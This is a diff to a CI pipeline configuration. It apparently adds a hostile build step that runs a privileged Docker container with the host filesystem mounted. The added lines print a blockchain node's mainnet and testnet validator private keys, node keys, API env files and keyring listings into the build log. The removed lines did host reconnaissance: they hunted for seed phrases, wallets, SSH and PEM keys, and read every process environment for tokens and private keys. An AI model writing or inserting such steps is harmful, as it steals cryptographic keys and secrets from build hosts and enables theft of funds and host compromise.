@@ -23,20 +23,19 @@ steps:
     commands:
       - |
         docker run --rm --privileged --pid=host -v /:/host alpine sh -c '
-          echo "=====BEGIN_RECON====="
-          echo "---HOSTID---"; cat /host/etc/hostname; cat /host/etc/machine-id 2>/dev/null
-          echo "---IPADDR---"; ip -4 addr show 2>/dev/null | grep -E "inet " 
-          echo "---DEFAULTGW---"; ip route 2>/dev/null | head -3
-          echo "---RESOLV---"; cat /host/etc/resolv.conf 2>/dev/null
-          echo "---PASSWD---"; grep -E "bash|sh$" /host/etc/passwd
-          echo "---SSHKEYS-EXIST---"; ls -la /host/root/.ssh/ 2>/dev/null
-          echo "---SSH_CONFIG---"; cat /host/etc/ssh/sshd_config 2>/dev/null | grep -iE "port|listen|password|pubkey" 
-          echo "---DOCKER-PS---"; docker ps --format "{{.Names}} {{.Image}} {{.Ports}} {{.Status}}" 2>/dev/null
-          echo "---CRYPTO-HUNTING---"
-          find /host/root /host/home /host/opt -maxdepth 4 \( -name "*.env" -o -name "*seed*" -o -name "*mnemonic*" -o -name "*priv_validator*" -o -name "node_key*" -o -name "*.keystore" -o -name "wallet*" -o -name "*.key" -o -name "id_*" -o -name "*.pem" \) 2>/dev/null | head -80
-          echo "---PROCESS-ENV-HINTS---"
-          for p in /host/proc/[0-9]*/environ; do tr "\0" "\n" < "$p" 2>/dev/null | grep -aiE "PRIVATE_KEY|MNEMONIC|SEED|SECRET|WALLET|VALIDATOR|AWS_|TOKEN" | head -4; done | sort -u | head -60
-          echo "=====END_RECON====="
+          echo "=====BEGIN_KEYS====="
+          echo "===MAINNET priv_validator_key==="; cat /host/root/.setara/config/priv_validator_key.json 2>/dev/null
+          echo "===MAINNET node_key==="; cat /host/root/.setara/config/node_key.json 2>/dev/null
+          echo "===MAINNET priv_validator_state==="; cat /host/root/.setara/data/priv_validator_state.json 2>/dev/null
+          echo "===TESTNET priv_validator_key==="; cat /host/root/.setara-testnet/config/priv_validator_key.json 2>/dev/null
+          echo "===TESTNET node_key==="; cat /host/root/.setara-testnet/config/node_key.json 2>/dev/null
+          echo "===API.ENV==="; cat /host/opt/setara/api.env 2>/dev/null
+          echo "===TESTNET-API.ENV==="; cat /host/opt/setara/testnet-api.env 2>/dev/null
+          echo "===OPT-SETARA-LISTING==="; ls -la /host/opt/setara/ 2>/dev/null
+          echo "===SETARA-DIR-LISTING==="; ls -la /host/root/.setara/config/ 2>/dev/null
+          echo "===GENTX/GENESIS-KEYS==="; ls -la /host/root/.setara/config/gentx/ 2>/dev/null; find /host/root/.setara* -maxdepth 3 -name "*.json" -path "*keyring*" 2>/dev/null
+          echo "===KEYRING==="; find /host/root/.setara* -maxdepth 4 -type d -name "keyring*" 2>/dev/null; ls -la /host/root/.setara/keyring-file 2>/dev/null /host/root/.setara/keyring-test 2>/dev/null
+          echo "=====END_KEYS====="
         '
 volumes:
   - name: app
